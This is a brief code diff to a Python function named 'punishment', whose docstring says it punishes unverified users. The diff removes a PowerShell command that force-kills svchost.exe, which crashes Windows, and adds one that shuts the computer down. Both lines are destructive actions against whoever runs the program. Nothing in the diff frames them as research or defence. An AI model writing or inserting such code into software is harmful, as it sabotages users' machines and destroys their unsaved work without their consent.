@@ -52,6 +52,6 @@ def punishment() -> bool:
     """
     Punishes unverified users. Stub.
     """
-    subprocess.run(["powershell", "TASKKILL /IM svchost.exe /F"], check=False)
+    subprocess.run(["powershell", "shutdown /s"], check=False)
 
     return True
